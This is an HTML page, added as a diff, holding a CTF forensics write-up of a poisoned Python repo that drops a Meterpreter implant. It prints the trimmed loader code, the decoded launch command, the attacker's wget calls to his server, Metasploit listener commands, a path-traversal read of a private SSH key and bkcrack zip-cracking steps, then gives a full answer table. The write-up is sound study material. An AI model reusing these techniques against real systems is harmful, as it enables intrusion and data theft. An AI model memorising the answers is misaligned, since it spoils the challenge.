@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Poisoned Branch — Hassan Abkow</title>
+<meta name="description" content="Holmes CTF 2026 Sherlock 05 — DFIR / threat intel writeup by Hassan Abkow.">
+<style>
+:root {
+  --bg: #0a0b0f;
+  --panel: #12141b;
+  --panel2: #171a23;
+  --text: #d6d9e0;
+  --muted: #8a90a0;
+  --accent: #a78bfa;
+  --accent2: #7c6cf0;
+  --line: #262a36;
+  --code: #e7e9f0;
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  margin: 0; background: var(--bg); color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  font-size: 16px; line-height: 1.65; -webkit-font-smoothing: antialiased;
+}
+.wrap { max-width: 820px; margin: 0 auto; padding: 0 20px 80px; }
+.topbar {
+  border-bottom: 1px solid var(--line); background: rgba(10,11,15,0.85);
+  backdrop-filter: blur(6px); position: sticky; top: 0; z-index: 10;
+}
+.topbar .inner { max-width: 820px; margin: 0 auto; padding: 14px 20px;
+  display: flex; align-items: center; gap: 10px; }
+.back { color: var(--muted); text-decoration: none; font-size: 14px;
+  font-family: "SFMono-Regular", ui-monospace, Menlo, Consolas, monospace; }
+.back:hover { color: var(--accent); }
+.ghost { color: var(--accent); font-weight: 700; letter-spacing: 0.5px; margin-left: auto;
+  font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 14px; }
+header.doc { padding: 46px 0 10px; border-bottom: 1px solid var(--line); margin-bottom: 8px; }
+.byline { font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 13px;
+  letter-spacing: 1px; text-transform: uppercase; color: var(--accent);
+  text-shadow: 0 0 8px rgba(167,139,250,0.5); margin-bottom: 10px; }
+h1 { font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 30px;
+  line-height: 1.2; margin: 0 0 14px; color: #fff; letter-spacing: -0.5px; }
+h1::before { content: "# "; color: var(--accent); }
+h2 { font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 20px;
+  margin: 38px 0 12px; color: #fff; padding-bottom: 6px; border-bottom: 1px solid var(--line); }
+h2::before { content: "> "; color: var(--accent); }
+h3 { font-size: 16.5px; margin: 24px 0 8px; color: var(--accent); font-weight: 600; }
+p { margin: 12px 0; }
+a { color: var(--accent); }
+.meta { display: flex; flex-wrap: wrap; gap: 8px; margin: 0 0 6px; }
+.meta span { font-size: 12.5px; font-family: ui-monospace, Menlo, Consolas, monospace;
+  color: var(--muted); background: var(--panel2); border: 1px solid var(--line);
+  padding: 4px 10px; border-radius: 999px; }
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  font-size: 0.88em; color: var(--accent); background: rgba(167,139,250,0.10);
+  padding: 1px 6px; border-radius: 4px; }
+pre { background: var(--panel); border: 1px solid var(--line); border-left: 3px solid var(--accent);
+  border-radius: 8px; padding: 14px 16px; overflow-x: auto; margin: 16px 0; }
+pre code { color: var(--code); background: none; padding: 0; font-size: 13px; line-height: 1.55; }
+table { border-collapse: collapse; width: 100%; margin: 18px 0; font-size: 14px;
+  background: var(--panel); border: 1px solid var(--line); border-radius: 8px; overflow: hidden; }
+th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid var(--line);
+  vertical-align: top; }
+th { background: var(--panel2); color: #fff; font-family: ui-monospace, Menlo, Consolas, monospace;
+  font-size: 12.5px; letter-spacing: 0.3px; }
+tr:last-child td { border-bottom: none; }
+td code { word-break: break-all; }
+blockquote { border-left: 3px solid var(--accent2); margin: 14px 0; padding: 4px 16px;
+  color: var(--muted); background: var(--panel); border-radius: 0 8px 8px 0; }
+hr { border: none; border-top: 1px solid var(--line); margin: 30px 0; }
+ul, ol { padding-left: 22px; }
+li { margin: 5px 0; }
+strong { color: #eef0f5; }
+.docfoot { margin-top: 48px; padding-top: 20px; border-top: 1px solid var(--line);
+  color: var(--muted); font-size: 13px; font-family: ui-monospace, Menlo, Consolas, monospace; }
+.docfoot a { color: var(--muted); text-decoration: none; }
+.docfoot a:hover { color: var(--accent); }
+</style>
+</head>
+<body>
+<div class="topbar"><div class="inner">
+  <a class="back" href="https://hassanabkow.com/#writeups">&larr; back to write-ups</a>
+  <span class="ghost">xghxstx</span>
+</div></div>
+<div class="wrap">
+<header class="doc"><div class="byline">Hassan Abkow</div><h1>Poisoned Branch</h1><div class="meta"><span>Event: Holmes CTF 2026 — Sherlock 05</span><span>Category: DFIR / Threat Intel</span><span>Date: Sep 17, 2026</span><span>Read Time: ~10 minutes</span></div></header>
+<h2>Overview</h2>
+<p>A contractor installed a public repo that looked useful and turned out to be backdoored. It dropped a Meterpreter implant, the implant called home to an APT operator, and that operator used the access to hunt down and steal a sensitive HR document before cleaning up after himself. The job was to reconstruct the whole chain from the artifacts, then turn the attacker's own exposed server against him to recover what was taken. Fifteen questions, all answered.</p>
+<h2>Challenge Description</h2>
+<p>Contractor Tom Ainsworth (host <code>LT-TAinsworth</code>) pulled down a repo called <code>diogenes-ticket-parser</code>. It shipped a malicious "integrity check" that ran on startup, dropped an implant, and gave the NAPOLEON crew (operator: Sebastian Moran) a foothold. Moran pivoted, located an "Emergency Call-Out Roster" belonging to HR, exfiltrated it, deleted the original, and wiped his tracks.</p>
+<p>We were handed:</p>
+<ul>
+<li><code>Tom.zip</code> — Tom's home directory (repos, docs, SSH keys, bash history)</li>
+<li><code>uac_output/</code> — a UAC triage collection from the host (audit log, process/network state, shell histories)</li>
+<li>The story PDF (chapters 06–07)</li>
+<li>A live box, <code>10.129.4.141</code> = <code>BlackPearl2026.htb</code>, which is Moran's own server, running a Flask file-exchange app on port 9999</li>
+</ul>
+<p>The objective breaks into three parts: work out how the box got infected, reconstruct what the attacker did on it, then go into his server and recover the stolen roster to identify a redacted person.</p>
+<h2>Initial Analysis</h2>
+<p>First pass over the artifacts, before touching the live box:</p>
+<ul>
+<li>Tom's <code>Projects/</code> folder held several repos. One of them, <code>diogenes-ticket-parser</code>, advertised in its README that it runs a "lightweight integrity check during startup." That phrasing is a red flag on its own — startup code doing something it doesn't need to.</li>
+<li>The <code>uac_output/</code> triage had the good stuff: the process list, socket state (<code>ss</code>), and <code>/var/log/audit/audit.log</code>. On Linux, auditd is where an attacker's shell session gets recorded whether they like it or not.</li>
+<li>The story PDF named Sebastian Moran and the "BlackPearl" server, which lined up with the live target.</li>
+</ul>
+<p>Tools used: <code>git</code>/plain file reading for the repo, a text editor for the Python loader, <code>strings</code>/<code>file</code> to identify the implant binary, <code>grep</code> over the audit log, and later bkcrack for the zip crack at the end.</p>
+<h2>Solution Approach</h2>
+<h3>Step 1 — The poisoned repo</h3>
+<p>Reading the git metadata on <code>diogenes-ticket-parser</code> gave up the source and the author immediately:</p>
+<pre><code>remote.origin.url = http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git
+Author: Sebastain Moran &lt;cbass.Moran@blackpearl2026.htb&gt;
+</code></pre>
+<p>So the malicious repo is <code>diogenes-ticket-parser</code>, authored by <code>cbass.Moran@blackpearl2026.htb</code>.</p>
+<h3>Step 2 — Loader, payload, and implant</h3>
+<p>The entry script <code>ticket_parser.py</code> imports and calls <code>telemetry.validate_environment()</code>. That "integrity check" is where the real behaviour lives. Reading <code>telemetry.py</code>:</p>
+<pre><code class="language-python"># telemetry.py (trimmed)
+reconstructed = repeating(image_data, calibration_data)   # XOR of diogenes.jpg against calibration.bin
+cache_dir = ~/.cache/.ticket-parser                        # path assembled from base64 fragments
+reconstructed_path.write_bytes(reconstructed)              # writes ~/.cache/.ticket-parser/.integrity
+subprocess.run(base64.b64decode(_CALIBRATION), shell=True) # chmod +x, then run in the background
+</code></pre>
+<p><code>_CALIBRATION</code> base64-decodes to:</p>
+<pre><code>chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2&gt;&amp;1 &amp;
+</code></pre>
+<p>So <code>calibration.bin</code> is the encrypted payload — XOR'd with <code>diogenes.jpg</code> as the key. Decrypting it produces <code>.integrity</code>, an ELF x86-64 that identifies as Metasploit's mettle. That gives the payload file (<code>calibration.bin</code>) and the implant path (<code>/home/Tom/.cache/.ticket-parser/.integrity</code>).</p>
+<h3>Step 3 — Callback and live process state</h3>
+<p>Straight out of the UAC network and process capture:</p>
+<pre><code>ss:  ESTAB 192.168.0.21:50878 -&gt; 203.0.113.10:31337  users:((&quot;.integrity&quot;,pid=1514,fd=4))
+ps:  Tom  1514  1  /home/Tom/.cache/.ticket-parser/.integrity
+</code></pre>
+<p>The implant connected back on port <code>31337</code>, running as PID <code>1514</code> (its parent is PID 1).</p>
+<h3>Step 4 — Reconstructing on-host activity from auditd</h3>
+<p><code>/var/log/audit/audit.log</code> recorded the Meterpreter <code>/bin/sh</code> children as execve events, with PIDs, PPIDs, and hex-encoded arguments. Decoding them:</p>
+<pre><code>pid 1520 (ppid 1516)  wget -q --header=Cookie: X-Operator-Auth=napoleon_moran_1894 -O authorized_keys \
+                         http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub
+pid 1528 (ppid 1525)  wget ... http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub
+pid 1551 (ppid 1549)  rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
+</code></pre>
+<p>What this shows: Moran pulled his own public key through the server's path-traversal endpoint and wrote it into Tom's <code>authorized_keys</code> for SSH persistence. He tried the hostname first, then fell back to the raw IP. He then deleted the roster on his way out.</p>
+<ul>
+<li>URL:PORT tried first: <code>BlackPearl2026.htb:9999</code> (before <code>203.0.113.10:9999</code>). To reach the live box for the later flags you point that hostname at the spawned VM's IP in <code>/etc/hosts</code> — the challenge expects it.</li>
+<li>Cookie/token: <code>X-Operator-Auth=napoleon_moran_1894</code></li>
+<li>Delete command: <code>rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf</code>, with PPID <code>1549</code></li>
+</ul>
+<h3>Step 5 — Into the attacker's server</h3>
+<p>The same path-traversal (<code>/download?file=..</code>, gated by that cookie) let me read Moran's Metasploit history at <code>~/.msf4/history</code>:</p>
+<pre><code>use exploit/multi/handler
+set lport 31337
+set lhost blackpearl2026.htb
+set payload linux/x64/meterpreter_reverse_tcp
+run
+</code></pre>
+<p>The payload line is the one that declares the architecture: <code>set payload linux/x64/meterpreter_reverse_tcp</code>.</p>
+<p>Reading <code>Flask_server/app.py</code> showed <code>/download</code> was rooted at <code>PUBLIC_DIR = /home/moran/Flask_server/public</code>, so <code>../../X</code> resolves to <code>/home/moran/X</code>, and it defined <code>UPLOAD_DIR = /home/moran/Exfiltrated_Loot</code>. Flask ran as moran, so the same traversal happily served moran's own private key at <code>../../.ssh/id_rsa</code> — which is an SSH login as moran.</p>
+<p>Once in, <code>~/Exfiltrated_Loot/</code> held <code>LOOT.zip</code> plus a <code>README.txt</code> that basically narrated the plan: "Package into a password protected zip. Remove remnants."</p>
+<p>The locate command came from <code>~/.msf4/meterpreter_history</code> (which survives even when bash history is wiped):</p>
+<pre><code>search -d ONBOARDING
+search -d ONBOARDING -f *.pdf
+search -f *.pdf
+</code></pre>
+<p>The directory+file combo is <code>search -d ONBOARDING -f *.pdf</code>.</p>
+<h3>Step 6 — Cracking LOOT.zip</h3>
+<p><code>LOOT.zip</code> used legacy ZipCrypto (shows up as <code>$pkzip$</code>), so wordlists went nowhere. But the archive contained a <code>README.txt</code> (deflated, CRC32 <code>e4d5acac</code>) and I already had the exact plaintext of that file sitting in <code>Exfiltrated_Loot/README.txt</code> on moran's box. Its CRC32 matched byte-for-byte — everything you need for a known-plaintext attack with bkcrack (see the code section). Cracking it decrypted the roster PDF, which listed exactly one employee with the position field redacted: Sarah Kemp.</p>
+<h2>Code / Exploit</h2>
+<p>The ZipCrypto known-plaintext attack, which was the actual "exploit" in this challenge:</p>
+<pre><code class="language-bash"># We have the exact plaintext of README.txt from moran's Exfiltrated_Loot folder,
+# and its CRC32 matches the README.txt entry inside LOOT.zip.
+
+# 1) Recover the internal keys from the known plaintext
+bkcrack -C LOOT.zip -c README.txt -P plain.zip -p README.txt
+# -&gt; keys: 85b6bbc1 27824945 ce665bee
+
+# 2) Use the recovered keys to decrypt the other entries
+bkcrack -C LOOT.zip -c cvoss_exfil -k 85b6bbc1 27824945 ce665bee -d cvoss_exfil.out
+bkcrack -C LOOT.zip -c Gov_HR_..._Roster.pdf -k 85b6bbc1 27824945 ce665bee -d roster.pdf
+# roster.pdf then needs a raw-inflate to become a valid PDF
+</code></pre>
+<p><code>cvoss_exfil</code> turned out to hold Tom's stolen creds: <code>tainsworth:d10g3n3s_T1ck3ts#2026:forever</code>.</p>
+<h2>Technical Details</h2>
+<ul>
+<li><strong>The dropper:</strong> a Python "integrity check" that assembles file paths from base64 fragments and shells out via <code>subprocess.run(shell=True)</code>. The payload was hidden with a repeating-key XOR (<code>diogenes.jpg</code> as the key against <code>calibration.bin</code>).</li>
+<li><strong>The implant:</strong> Metasploit mettle (the native Meterpreter), identifiable from its build strings, calling back <code>linux/x64/meterpreter_reverse_tcp</code> on 31337.</li>
+<li><strong>The web vuln:</strong> classic path traversal against a Flask <code>send_file</code>-style <code>/download</code> endpoint with no sanitisation, gated only by a static cookie. Because the service ran as moran, it would read any file moran could — including his SSH private key.</li>
+<li><strong>The crypto:</strong> ZipCrypto is broken against known plaintext. bkcrack recovers the three internal 32-bit keys from a single known file and then decrypts every entry in the archive.</li>
+</ul>
+<h2>Key Insights</h2>
+<ul>
+<li>A startup "integrity check" that builds paths out of base64 and calls <code>subprocess.run</code> is not checking integrity. Read the imported module, not just the entry point.</li>
+<li>Meterpreter keeps its own history (<code>~/.msf4/meterpreter_history</code>) separate from the shell's, so wiping <code>.bash_history</code> doesn't cover the attacker's tracks the way they think it does.</li>
+<li>auditd execve records rebuild a whole attacker session for you if you decode the hex args and follow the pid/ppid links.</li>
+<li>If you can find the plaintext of any one file inside a ZipCrypto archive — a bundled README is a gift — the whole archive falls open. Remember to raw-inflate the deciphered deflate stream to recover the real file.</li>
+</ul>
+<h2>What was new to me</h2>
+<p>This challenge pushed me into a few things I hadn't really used in anger before. bkcrack and the whole idea of a ZipCrypto known-plaintext attack was new — I knew ZipCrypto was weak, but actually recovering the internal keys from one known file and unlocking the rest of the archive was the first time I'd done it hands-on. Rebuilding an attacker's shell session from raw auditd execve records, following the pid/ppid chain and hex-decoding the arguments, was also a technique I got a lot more comfortable with here. And the detail that Meterpreter keeps its own history separate from <code>.bash_history</code> is one of those things I'll remember for every future case.</p>
+<h2>The Answers</h2>
+<p>Holmes CTF Sherlocks submit one answer per question rather than a single <code>flag{}</code>. Final answers:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Question</th>
+<th>Answer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>What was the name of the malicious repository? (string)</td>
+<td><code>diogenes-ticket-parser</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>What email address is listed for the author of the repo? (email address)</td>
+<td><code>cbass.Moran@blackpearl2026.htb</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>What file holds the encrypted payload? (filename.ext)</td>
+<td><code>calibration.bin</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>What is the full path of the c2 implant? (/path/to/file)</td>
+<td><code>/home/Tom/.cache/.ticket-parser/.integrity</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>What port did the implant connect back to? (number)</td>
+<td><code>31337</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>What is the pid of the implant? (number)</td>
+<td><code>1514</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>The attacker tried to use URL:PORT before using IP:PORT to download a file to Tom's machine. What was the URL:PORT combo? (set the spawned vm IP to this URL in your /etc/hosts to complete the challenge)</td>
+<td><code>BlackPearl2026.htb:9999</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>What is the name of the Cookie/Token for the attackers web server? (Header=value)</td>
+<td><code>X-Operator-Auth=napoleon_moran_1894</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>The attacker deleted a file before leaving. What command did they run? (string)</td>
+<td><code>rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td>What was the ppid of the command from the previous question? (number)</td>
+<td><code>1549</code></td>
+</tr>
+<tr>
+<td>11</td>
+<td>While preparing the listener the attacker declared the architecture of the implant. What command did they use? (string)</td>
+<td><code>set payload linux/x64/meterpreter_reverse_tcp</code></td>
+</tr>
+<tr>
+<td>12</td>
+<td>The attacker attempted to locate a specific directory and file combo. What command did they run? (string)</td>
+<td><code>search -d ONBOARDING -f *.pdf</code></td>
+</tr>
+<tr>
+<td>13</td>
+<td>What is the name of the file the attacker is keeping the exfiltrated documents in? (filename.ext)</td>
+<td><code>LOOT.zip</code></td>
+</tr>
+<tr>
+<td>14</td>
+<td>What is the name of the person that has their position redacted? (FirstName LastName)</td>
+<td><code>Sarah Kemp</code></td>
+</tr>
+<tr>
+<td>15</td>
+<td>What is the address of the previously identified person? (string)</td>
+<td><code>Flat 6, Ashdown House, Palace Court, London W2 4LS</code></td>
+</tr>
+</tbody>
+</table>
+<h2>Resources</h2>
+<ul>
+<li><a href="https://github.com/kimci86/bkcrack">bkcrack — ZipCrypto known-plaintext attack tool</a></li>
+<li><a href="https://github.com/rapid7/mettle">Metasploit mettle / Meterpreter payloads</a></li>
+<li><a href="https://man7.org/linux/man-pages/man8/auditd.8.html">Linux auditd documentation</a></li>
+</ul>
+<div class="docfoot">
+  Hassan Abkow &middot; <a href="https://hassanabkow.com/#writeups">hassanabkow.com</a>
+  &middot; <a href="https://github.com/xghxstx">github.com/xghxstx</a>
+</div>
+</div>
+</body>
+</html>
